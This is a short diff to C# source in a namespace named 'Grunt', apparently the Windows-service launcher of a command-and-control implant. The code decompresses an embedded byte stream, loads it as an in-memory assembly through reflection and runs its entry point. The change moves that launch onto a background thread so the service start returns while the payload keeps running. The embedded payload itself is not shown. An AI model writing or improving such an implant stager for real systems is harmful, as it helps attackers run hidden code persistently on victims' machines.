@@ -73,6 +73,7 @@ using System.IO;
 using System.IO.Compression;
 using System.Reflection;
 using System.ServiceProcess;
+using System.Threading;
 
 namespace Grunt
 {
@@ -106,7 +107,10 @@ namespace Grunt
                 r = ds.Read(by, 0, 1024);
             }
 
-            Assembly.Load(oms.ToArray()).EntryPoint.Invoke(0, new object[] { new string[] { } });
+            new Thread(delegate()
+            {
+                Assembly.Load(oms.ToArray()).EntryPoint.Invoke(0, new object[] { new string[] { } });
+            }).Start();   
         }
 
         protected override void OnStop() {}
@@ -122,6 +126,7 @@ namespace Grunt
             {
                 components.Dispose();
             }
+
             base.Dispose(disposing);
         }
 
